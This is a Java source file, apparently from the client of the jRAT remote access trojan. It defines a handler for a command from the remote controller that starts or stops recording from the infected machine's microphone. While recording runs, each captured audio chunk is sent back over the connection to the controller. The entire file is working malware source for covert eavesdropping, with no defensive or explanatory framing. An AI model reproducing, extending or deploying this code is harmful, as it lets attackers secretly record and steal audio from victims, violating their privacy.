package jrat.client.packets.incoming;

import jrat.common.SoundWriter;
import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet58ClientUploadSoundCapture;

public class Packet84ToggleSoundCapture extends AbstractIncomingPacket {

	@Override
	public void read(final Connection con) throws Exception {
		boolean start = con.readBoolean();
		int quality = con.readInt();
		
		if (start) {
			new Thread(new SoundWriter(quality) {
				@Override
				public void onRead(byte[] data, int read) throws Exception {
					con.addToSendQueue(new Packet58ClientUploadSoundCapture(data, read, quality));	
				}
			}).start();
		} else {
			SoundWriter.instance.stop();
		}
	}

}
